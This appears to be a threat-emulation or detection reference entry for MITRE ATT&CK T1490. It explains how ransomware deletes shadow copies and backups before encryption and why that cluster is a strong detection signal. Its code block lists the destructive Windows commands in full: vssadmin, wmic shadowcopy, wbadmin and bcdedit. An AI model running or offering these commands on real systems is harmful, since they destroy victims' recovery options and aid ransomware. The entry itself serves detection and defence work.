---
id: inhibit-recovery-vssadmin
title: Inhibit system recovery (delete shadow copies + backups)
section: Impact
phase: Impact
attack:
  tactic: TA0040
  techniques: [T1490]
platform: [windows]
source: MITRE ATT&CK T1490; ransomware pre-encryption recovery denial
pair: inhibit-recovery-4688
---

The universal ransomware precursor: before (or during) encryption, destroy every
local rollback path so victims can't restore for free — delete Volume Shadow Copies,
wipe the backup catalog, and disable Windows recovery. It's a tight, high-signal
cluster of built-in LOLBins run back to back, almost never seen legitimately outside
a deliberate admin action. That very cluster is the earliest reliable detection point
in the kill chain.

```cmd
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled no
bcdedit /set {default} bootstatuspolicy ignoreallfailures
```
